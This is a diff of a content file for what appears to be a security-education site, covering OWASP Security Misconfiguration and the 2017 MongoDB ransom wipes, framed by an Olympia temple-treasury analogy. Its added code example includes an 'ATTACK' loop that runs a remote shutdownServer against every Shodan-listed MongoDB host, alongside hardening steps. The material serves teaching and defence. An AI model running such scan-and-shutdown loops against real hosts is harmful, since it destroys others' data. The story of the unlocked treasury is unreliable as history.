+        "The Temple of Zeus at Olympia — site of the original Olympic Games and home to the great chryselephantine statue of Zeus that Pheidias completed around 435 BCE — housed an enormous treasury that had accumulated offerings from athletes, kings, and city-states across centuries of games. The treasury keepers, confident that the sanctuary's pan-Hellenic religious status would protect it from desecration, had never installed mechanical locks on the treasury doors — the default state was open, relying entirely on social and divine deterrence. When Emperor Theodosius I closed all pagan temples across the Roman Empire in 392 CE, the assumption of divine protection evaporated overnight. The treasuries, which had stood unlocked for centuries, were systematically looted — their security model had depended entirely on an external authority that no longer existed.",
+        "Security Misconfiguration (OWASP A05:2021) is the most widespread vulnerability class — present in 90% of web applications tested across all OWASP assessments. It requires no exploit code. The vulnerability is the absence of a configuration: authentication disabled, default credentials unchanged, unnecessary ports exposed, error messages revealing internal details, cloud storage buckets set to public. Misconfiguration is systematically discoverable at internet scale using tools like Shodan, Censys, and Nuclei — scanners that continuously index internet-accessible services and identify those with security-relevant misconfigurations. If your MongoDB instance has no password and is bound to 0.0.0.0, Shodan has already indexed it.",
+        "The MongoDB 'apocalypse' of January 2017 demonstrated what systematic automated discovery of misconfiguration looks like at scale. Security researcher Victor Gevers found over 35,000 MongoDB instances on the internet with no authentication enabled — the default configuration for MongoDB prior to version 3.6. Within 24 hours of Gevers' public report, automated attackers had scanned Shodan for the same instances, connected without credentials, downloaded the data, deleted the contents, and left ransom notes demanding Bitcoin for the return of the data (data they may or may not have actually kept). Over 27,000 databases wiped in one day.",
       ],
       technical: {
-        title: "Common Security Misconfigurations",
+        title: "Security Misconfiguration — Default Configs, Exposed Ports, and Cloud Storage",
         body: [
-          "Default credentials: MongoDB shipped with no authentication requirement by default until version 3.0. Many administrators installed it and never configured authentication. SolarWinds used 'solarwinds123' as the password for its software update server — found in a public GitHub repository months before the breach.",
-          "Cloud misconfigurations: AWS S3 buckets default to private, but a single API call can make them public. Capital One, Twitch, GoDaddy, and thousands of other companies have exposed sensitive data via misconfigured S3 buckets.",
+          "Misconfiguration takes many forms but shares a root cause: software shipped with defaults optimized for development convenience, deployed into production without hardening. MongoDB prior to 3.6 bound to all interfaces (`0.0.0.0`) by default and required no authentication — appropriate for local development, catastrophic when deployed on a cloud VM with a public IP. Redis also bound to all interfaces with no authentication by default until version 6. Elasticsearch exposed full data access via unauthenticated HTTP on port 9200. Each of these was responsible for mass data exposures when developers deployed them on cloud infrastructure without reading the security hardening documentation.",
+          "Cloud storage misconfigurations are a persistent separate category. AWS S3 buckets default to private — but a single `s3api put-bucket-acl --acl public-read` or misconfigured bucket policy makes them publicly readable. GrayhatWarfare, an internet-scale S3 bucket scanner, has indexed millions of buckets, and security researchers regularly find sensitive data — credentials files, database backups, customer records, source code — in buckets that were made public accidentally. The 2021 Twitch source code leak (125GB), the 2020 GoDaddy configuration data exposure, and dozens of other major incidents originated from a single misconfigured S3 policy.",
         ],
         codeExample: {
-          label: "Checking for and fixing MongoDB authentication",
-          code: `# Insecure (default): MongoDB with no auth
+          label: "MongoDB misconfiguration: exposed by default, secured by config",
+          code: `# ── INSECURE (default MongoDB prior to 3.6) ───────────────────────────────────
+# Default: binds to 0.0.0.0, no authentication required
 mongod --port 27017
-# Any host on the internet can connect:
+# Any host with network access connects with no credentials:
 mongo --host victim.com:27017
-> db.citizens.find()  # → full treasury contents
+> show dbs
+> use production_db
+> db.users.find()   # → 2.3 million records, plaintext
 
-# Secure: enable authentication
-mongod --auth --port 27017
-# Create admin user:
-db.createUser({
-  user: "zeus_keeper",
+# ── ATTACK: automated scanner hits Shodan results ─────────────────────────────
+# Shodan search: product:"MongoDB" port:27017
+# Returns: thousands of open MongoDB instances globally
+for ip in shodan_results:
+    mongo --host {ip}:27017 --eval "db.getSiblingDB('admin').shutdownServer()"
+    # Or: download data, drop database, leave ransom note
+
+# ── SECURE MONGODB CONFIGURATION ──────────────────────────────────────────────
+# 1. Bind to localhost or specific internal IP only:
+mongod --bind_ip 127.0.0.1 --auth --port 27017
+
+# 2. Enable authentication and create admin user:
+mongosh --eval "db.createUser({
+  user: 'admin',
   pwd: passwordPrompt(),
-  roles: [{ role: "userAdminAnyDatabase", db: "admin" }]
-})
+  roles: ['userAdminAnyDatabase', 'readWriteAnyDatabase']
+})"
 
-# Also: bind to localhost only
-mongod --bind_ip 127.0.0.1 --auth`,
+# 3. Enable TLS for all connections
+# 4. Restrict network access via security groups — port 27017 never internet-facing
+
+# ── AUDIT YOUR OWN EXPOSURE ───────────────────────────────────────────────────
+# Check for open MongoDB on Shodan:
+# https://www.shodan.io/search?query=product%3A"MongoDB"+port%3A27017
+# If your IP appears: assume the data has already been accessed`,
         },
       },
       incident: {
-        title: "The Temple Treasury Apocalypse (392 CE) & MongoDB (2017)",
-        when: "January 2017 (MongoDB); October 2019–December 2020 (SolarWinds)",
-        where: "35,000+ MongoDB instances globally; SolarWinds Orion platform",
-        impact: "MongoDB: 27,000 databases wiped in 24 hours. SolarWinds: 18,000 customers backdoored",
+        title: "The MongoDB Apocalypse — 27,000 Databases Wiped in 24 Hours (2017)",
+        when: "January 2017",
+        where: "35,000+ MongoDB instances globally — startups, healthcare providers, e-commerce, financial services",
+        impact: "27,000+ databases deleted within 24 hours of public report; ransom demands sent; data loss in many cases permanent; repeat waves in 2020 and 2022",
         body: [
-          "When Emperor Theodosius closed pagan temples in 392 CE, investigators discovered that thousands of temple treasuries had no locks at all — the default configuration of the era. Accumulated offerings spanning centuries were looted within days. The temple keepers had assumed divine protection made locks unnecessary.",
-          "In January 2017, security researcher Victor Gevers found 35,000 MongoDB instances exposed to the internet with no authentication. Within days, automated attackers had scanned Shodan, identified all exposed instances, downloaded the data, deleted the originals, and left ransom notes. Over 27,000 databases were wiped in a single day. Both incidents share the same failure: security was treated as someone else's problem.",
+          "On January 2, 2017, security researcher Victor Gevers reported on Twitter that he had found over 35,000 MongoDB database instances exposed to the internet with no authentication. MongoDB had shipped with bind-to-all-interfaces and no-authentication as the default configuration since its release in 2007, and a significant portion of users had deployed it on cloud infrastructure without reading the security hardening documentation. The instances contained production data from companies worldwide: customer records, healthcare data, e-commerce orders, financial records, and personal information. Gevers had been quietly contacting the owners of exposed instances for months, warning them to secure their databases.",
+          "Within 24 hours of the public report, automated attackers had run Shodan searches, identified exposed MongoDB instances, connected without credentials, downloaded whatever data was stored, dropped the databases, and left a single document in the emptied database: a ransom note demanding 0.2 Bitcoin for the 'return' of the data. The ransom demand implied the attackers had copied the data before deletion — in many cases they had not; the data was simply gone. Over 27,000 databases were wiped in a single day. The attack wave was covered by major security publications and then repeated: a second MongoDB wipe campaign hit in May 2017, a third in 2020, and a fourth in 2022 targeting Elasticsearch and Redis instances on the same exposed-by-default principle.",
+          "The MongoDB apocalypse became the defining example of Security Misconfiguration at internet scale, but the broader pattern continued. ElasticSearch exposed healthcare data for 43 million patients in a 2019 incident. A misconfigured Elasticsearch index exposed 1.2 billion records in November 2019 — the largest data exposure ever found at the time. AWS S3 misconfiguration has exposed data from the US Department of Defense, Twitch, GoDaddy, Facebook, and thousands of smaller organizations. The pattern is always the same: software that defaulted to open for development convenience, deployed to production without hardening, indexed by automated scanners within hours of deployment. Security misconfiguration requires no exploit code, no sophisticated attack, and no prior knowledge of the target — just a Shodan search and a connection attempt.",
         ],
       },
       diagram: {
